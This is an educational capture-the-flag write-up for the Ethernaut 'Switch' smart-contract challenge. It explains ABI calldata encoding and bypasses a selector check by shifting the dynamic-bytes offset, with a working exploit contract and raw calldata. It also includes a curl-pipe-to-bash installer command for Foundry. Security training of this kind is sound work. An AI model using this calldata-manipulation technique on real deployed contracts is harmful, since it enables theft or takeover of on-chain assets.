# Writeup for Switch

- Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you're new to Solidity and haven't deployed a smart contract before, you can learn how to do so using Remix [here](https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k).

### Challenge Description

Just have to flip the switch. Can't be that hard, right?

Things that might help:

- Understanding how CALLDATA is encoded.

### Key Concepts To Learn

lets learn some low-level inbuilt functions in solidity.

In smart contracts, whenever you call a function in another contract, you send some data to that contract. The contract then runs some opcodes to check whether the data sent includes a function selector. In general we write our contracts in Solidity which is a high-level language for writing smart contracts then solidity compiler will convert the code we have written into opcodes then it compiles into bytecode and the bytecode will be published on blockchain when we deploy our contract.

If we observe the bytecode we can find that it is a large hex text with each byte represent a opcode and each opcode will run a low-level predefined function.

The functions CALLDATASIZE, CALLDATALOAD, CALLDATACOPY are such low-level functions.

1. **CALLDATASIZE:** This opcode returns the length of the calldata.

   - **Example:** If you call a function in a contract and the function does not accept any arguments, the calldata will consist only of the function selector. In this case, `CALLDATASIZE` will return 4, as the function selector is 4 bytes long.

2. **CALLDATALOAD:** This opcode will push 32 bytes of transaction data onto the stack.

   - **Example:** If you call a function in a contract that accepts two arguments of type `uint256` and `uint256`, `CALLDATALOAD` will push the function selector and the first 28 bytes of the first argument onto the stack.

3. **CALLDATACOPY(mem_pos, start_byte, size):** This opcode will copy `size` number of bytes starting from `start_byte` to the memory at position `mem_pos`.

   - **Example:** If you assign a value sent in a function call to an array at index `i`, the function will copy the calldata to the array at index `i`.

Check the below example to understand the calldatacopy in depth

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract contract_one{

    function hello(uint256 _num) public pure returns (uint256) {
        uint256 num;
        assembly {
            let ptr := mload(0x40)
            calldatacopy(ptr, 4, 32)
            num := mload(ptr)
        }
        return num;
    }
}
```

In the `hello()` function written in assembly, the `ptr` variable is used to load the free memory pointer. The free memory pointer refers to the unused space in memory that can be utilized to store data.

Now I will explain how functions in contracts are called when you invoke a function. Basically, I will explain how ABI encoding works.

Before staring with abi encoding i want you guys to install foundry so that whatever i explain you can try out. If you have foundry setup that's fine else enter the following commands to download it.

```bash
mkdir foundry
cd foundry
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc
foundryup
```

Now enter the follwing to make sure foundry has installed successfully.

```bash
$ cast -V
```

```solidity

function hello(uint256 _num) public pure returns (uint256) {
    return _num;
}
```

Suppose there is a function like this in a contract. When you call this function, the calldata won't be sent as the name of the function. Instead, it will be the hash of the function name along with its arguments, which is also called the function selector. Along with the function selector, the actual arguments data is sent.

If you want to call this function, the calldata will be `0xb0f0c96a0000000000000000000000000000000000000000000000000000000000000064`. You can obtain the calldata using `cast`. Enter the following:

```shell
$ cast calldata "hello(uint256)" "100"
```

The output will be `0xb0f0c96a0000000000000000000000000000000000000000000000000000000000000064`.

```shell
$ cast pretty-calldata 0xb0f0c96a0000000000000000000000000000000000000000000000000000000000000064 -o
```

The output will be as follows.

<p align="center">
  <img src="img/img1.png" />
</p>

The method is identified by the function selector `0xb0f0c96a`, followed by the arguments passed to the function `0000000000000000000000000000000000000000000000000000000000000064`. If there are no arguments, the calldata will consist only of the function selector.

Suppose if the function is taking arguments as dynmaic array and a uint256 then abi encoding will be different.

```shell
$ cast calldata "hello(uint256[],uint256)" "[100,200]" "300"
```

The output will be `0x4ea346760000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012c0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000000c8`

```shell
$ cast pretty-calldata 0x4ea346760000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012c0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000000c8
```

The output will be as follows

<p align="center">
  <img src="img/img2.png" />
</p>

If we see the arguments of the latest `hello()` function, we can observe the first argument is a dynamic array. Since the size of a dynamic array is not fixed, the first slot will contain the pointer to where the array elements start. Then in the second slot, it will store the second argument of the array.

- In the zeroth slot (0x00), it is storing 0x40. 0x40 is the place where the length of the array is stored.
- In the first slot (0x20), it is storing the second argument (300 = 0x12c).
- In the second slot (0x40), it is storing the length of the array.
- In the third (0x60) and fourth (0x80) slots, the actual elements of the array are stored.

If the argument is a static array, then:

- In the zeroth slot (0x00) and first slot (0x20), it will store the elements of the array.
- In the second slot, it will store the second argument `uint256` (300).

I hope this makes sense. If you feel confusing click [here](https://docs.soliditylang.org/en/develop/abi-spec.html) to read the solidity documentation.

Whatever examples you see there, try those examples in your terminal using `cast` and visualize the output.

### Contract Explaination

If you understand the contract, you can move on to the [exploit](#exploit) part. If you're a beginner, please read the Contract Explanation to gain a better understanding of Solidity.

Click [here](./src/contracts/GatekeeperThree.sol) to view the contract source code.

<details>
<summary>Click to view the contract explanation</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}

```

The `Switch` contract has two state variables:

1. `switchOn`: A boolean (`bool`) that indicates whether the switch is on.
2. `offSelector`: A 4-byte (`bytes4`) variable that stores the function selector of the `turnSwitchOff()` function.

```solidity
    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }
```

The `onlyThis` modifier ensures that only the contract itself can call the function that uses this modifier.

```
modifier onlyOff() {
    // we use a complex data type to put in memory
    bytes32[1] memory selector;
    // check that the calldata at position 68 (location of _data)
    assembly {
        calldatacopy(selector, 68, 4) // grab function selector from calldata
    }
    require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
    _;
}
```

The modifier `onlyOff()` will copy 4 bytes from the calldata starting from the 68th byte into `selector`. It will compare the copied 4 bytes of data with `offSelector` (the function selector of `turnSwitchOff`). If it matches, the modifier will pass.

```
function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

```

The `flipSwitch()` function will take an argument of type `bytes` as input. Then it will execute the `onlyOff` modifier. If the modifier passes, it will make the call to this contract with the data passed.

```solidity
function turnSwitchOn() public onlyThis {
    switchOn = true;
}
```

The turnSwitchOn() function, when called, will execute the onlyThis modifier. If it passes, it will set switchOn to true.

```solidity
function turnSwitchOff() public onlyThis {
    switchOn = false;
}
```

The turnSwitchOff() function, when called, will execute the onlyThis modifier. If it passes, it will set switchOn to false.

</details>

### Exploit

The goal of this challenge is to make the switchOn true.

The only place at which switchOn is set to true is turnSwitchOn() function. But the onlyThis modifier will ensure that only the contract is calling the turnSwitchOn() function. So we won't be able to directly call the turnSwitchOn() function.

```solidity
function flipSwitch(bytes memory _data) public onlyOff {
    (bool success,) = address(this).call(_data);
    require(success, "call failed :(");
}
```

If we check the `flipSwitch()` function, it takes a `bytes` input. It then calls a function in the same contract whose function selector matches the data passed. Here if we pass the function selector of turnSwitchOn() it should call the turnSwitchOn() function but the onlyOff modifier will ensure that data passed is the function selector of turnSwitchOff() function.

Now lets observe the calldata for this function call assuming that we are calling turnSwitchOff function

```bash
$ cast sig "turnSwitchOff()"
```

This will return `0x20606e15`.

```bash
$ cast calldata "flipSwitch(bytes)" "0x20606e15"
```

This will return `0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000`.

Now lets breakdown the calldata.

```bash
$ cast pretty-calldata 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000
```

It will return as follows

<p align="center">
  <img src="img/img3.png" />
</p>

The arguemnt to flipSwitch() is of type bytes. bytes is a dynamic variable in solidity. So the value of bytes directly store in the first slot instead in the first slot it will store the offset at which the actual bytes start.

Here in the zeroth slot (0x00) it is storing (0x20) it is the offset at which the length of bytes is stored. Then in first slot (0x20) the length of bytes is stored. Then in the second slot (0x40) the actual bytes data is stored.

So during the function call the first argument value is purely depended on the pointer which is store at zeroth slot (0x00). Instead of pointing it to 0x20 if we make it to point 0x60 and then at 0x60 we need to send the length of bytes data and at 0x80 we need to send the actual bytes data.

If we do as above then call data will be as follows

<p align="center">
  <img src="img/img4.png" />
</p>

Now when we pass this data to the Switch contract, we are calling the `flipSwitch()` function, and the argument to the function refers to data in the zeroth slot (0x00), which is a pointer to the third slot (0x60). So it will get data from 0x60.

If we check the `onlyOff` modifier, it is copying 4 bytes of data starting from the 68th byte (4 bytes of function selector + 0x40) into a temporary array named `selector`. Then it compares the first element in the `selector` array with the `offSelector`.

In our data at 0x40, the data is the function selector of `turnSwitchOff()`, and `offSelector` is also the function selector of `turnSwitchOff()`. Since both match, the modifier will pass, but it will make a call to `turnSwitchOn()`.

That's it if you send this calldata to Switch contract then the challenge will be solved. Below is the Exploit contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ExploitSwitch {
    address Switch;
    constructor(address _addr){
        Switch=_addr;
    }
    function Exploit() public {
        bytes memory Calldata=hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool a,)=Switch.call(Calldata);
        require(a,"Exploit Failed");
    }
}

```

That's it for this challenge. Hope you enjoyed this challege

### Key takeaways

We should try to avoid depending on our logic based on calldata because calldata can be manipulated.

In this case, instead of comparing the value at the 68th byte, it should first check where the zeroth slot (0x00) is pointing. Then the `calldatacopy` should get data from that location and compare the value. If we do this, we can prevent this exploit.

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
